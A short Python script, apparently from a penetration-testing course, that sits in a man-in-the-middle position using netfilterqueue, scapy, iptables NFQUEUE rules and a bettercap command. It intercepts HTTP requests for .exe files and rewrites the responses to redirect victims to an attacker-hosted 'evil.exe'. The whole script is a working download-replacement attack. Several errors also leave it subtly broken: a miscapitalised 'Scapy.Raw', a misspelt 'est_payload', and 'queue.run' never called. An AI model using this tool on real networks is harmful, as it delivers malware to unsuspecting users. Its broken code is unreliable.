#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

# iptables -I FORWARD -j NFQUEUE --queue-num 0 # Remote computers
# iptables -I INPUT -j NFQUEUE --queue-num 0 # Local computers
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 # Local computers
# bettercap -face eth0s3 -caplet hstshijack/hstshijack

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80: # bettercap proxy: 8080 
            if b".exe" in scapy_packet[scapy.Raw].load and b"172.16.74.12" not in scapy_packet[Scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80: # bettercap proxy: 8080
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://172.16.74.12/evil_files/evil.exe\n\n")
                packet.est_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run

